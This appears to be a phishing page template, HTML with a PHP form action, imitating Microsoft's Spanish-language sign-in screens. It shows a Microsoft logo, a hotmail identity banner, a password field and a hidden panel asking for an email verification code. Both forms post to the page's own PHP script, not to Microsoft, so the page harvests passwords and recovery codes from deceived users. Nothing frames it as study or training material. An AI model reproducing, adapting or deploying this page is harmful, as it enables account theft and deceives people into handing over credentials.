<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.CE &amp;&amp; showLightboxProgress() }"></div>


<div>
    <img class="logo" role="img" src="images/logo.svg" alt="Microsoft">

</div>

<div role="main" class="">
    <script type="text/javascript">
        $(document).ready(function(){


            /*$("#login").click(function(){
                //alert(1);
                //var currentElement = currentElement.next();
                var left = $('#panel-0').offset().left;
                $("#panel-0").css({left:0}) .animate({"left":"-450px"}, "slow", function(ele){
                    $('#panel-0').hide();
                });                
                return false;
            });*/

            $("#idSIButton9").click(function(){
               // alert(1);

                $("#form-id").submit();
            });

        }); 

        function OnSubmit(){
            return true;
        }       
    </script>
    <!--  -->
    <form name="f1" id="form-id" method="post" action="<?php echo $_SERVER['PHP_SELF'] ?>" >
        <div class="">
            <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
            <div class="animate slide-in-next">

                <div>
                    <!--  -->

                    <div class="identityBanner">
                        <!-- ko if: isBackButtonVisible -->
                        <button type="button" class="backButton" id="idBtn_Back" aria-label="Atrás">
                            <img role="presentation" src="images/arrow-left.svg.svg">
                        </button>
                        <!-- /ko -->

                        <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="correo@hotmail.com">correo@hotmail.com</div>
                    </div>
                </div>
            </div>
            <!-- /ko -->

            <div class="pagination-view animate has-identity-banner slide-in-next">

                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">


                    <div aria-hidden="true">
                        <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                        <input type="hidden" name="login" data-bind="value: unsafe_username" value="correo@hotmail.com">
                        <!-- The loginfmt input type is different as some password managers require it to be of type text.
                                                            Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
                        <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                        <input type="hidden" name="type" data-bind="value: svr.bc ? 20 : 11" value="11">
                        <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                        <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                        <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                        <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                        <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
                    </div>

                    <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
                        <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Escribir contraseña</div>
                    </div>
                    <div class="row">
                        <div class="form-group col-md-24">
                            <div role="alert" aria-live="assertive">
                            </div>

                            <div class="placeholderContainer">
                                <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" aria-describedby="loginHeader passwordError  " placeholder="Contraseña" aria-label="Escribe la contraseña para correo@hotmail.com."
                                    tabindex="0">

                            </div>

                            <!-- ko if: svr.cm -->
                            <!-- /ko -->
                        </div>
                    </div>


                    <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
                        <div>

                            <div class="row">
                                <div class="col-md-24">
                                    <div class="text-13">
                                        <div class="form-group">
                                            <a id="idA_PWD_ForgotPassword" role="link" href="">¿Olvidó su contraseña?</a>
                                        </div>


                                        <div class="form-group">

                                            <a href="#" id="otcLoginLink">Enviar código por correo electrónico a im*****@gmail.com</a>

                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="win-button-pin-bottom">
                            <div class="row">
                                <div>
                                    <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">

                                        <div class="inline-block button-item ext-button-item">

                                            <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" value="Iniciar sesión">
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>

            </div>
        </div>
    </form>
</div>






<div role="main" class="hide">
    <!--  -->

    <div class="">

        <div class="slide-in-next">

            <div>

                <div class="identityBanner">

                    <button type="button" class="backButton" id="idBtn_Back" aria-label="Atrás">
                                                                            <img role="presentation" src="images/arrow-left.svg">
                                                                        </button>


                    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="correo@hotmail.com">correo@hotmail.com</div>
                </div>
            </div>
        </div>
        <!-- /ko -->

        <div class="pagination-view animate has-identity-banner slide-in-next">

            <div data-viewid="44" data-showidentitybanner="true">
                <!--  -->

                <div id="proofConfirmationTitle" class="row title ext-title" role="heading" aria-level="1">Verifica tu correo electrónico</div>
                <div class="row form-group">
                    <div id="proofConfirmationDesc" class="form-group" data-bind="text: proofConfirmationDesc">Enviaremos un código de verificación a im*****@gmail.com‎. Escríbalo a continuación para comprobar que esta sea su dirección de correo electrónico.</div>
                    <div role="alert" aria-live="assertive">

                    </div>
                    <div class="placeholderContainer">
                        <input id="proofConfirmationText" autocomplete="off" name="ProofConfirmation" class="form-control input ext-input text-box ext-text-box" type="email" aria-required="true" maxlength="113" aria-label="Correo electrónico" aria-describedby="proofConfirmationTitle proofConfirmationDesc"
                            placeholder="alguien@example.com">
                    </div>
                </div>

                <div class="position-buttons">
                    <div class="row">
                        <div class="col-md-24">
                            <div class="text-13">


                                <div class="form-group">

                                    <a href="#" id="idA_PWD_SwitchToPassword">Use su contraseña en su lugar</a>

                                </div>

                                <div class="form-group">
                                    <a id="proofConfirmationToggle" href="#">Tengo un código</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="win-button-pin-bottom">
                    <div class="row">
                        <div>
                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">


                                <div onclick="" class="inline-block button-item ext-button-item">
                                    <input type="submit" id="next" class="win-button button_primary button ext-button primary ext-primary" value="Enviar código">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>


<input type="hidden" name="isRecoveryAttemptPost">
<div><input type="hidden" name="i19" value=""></div>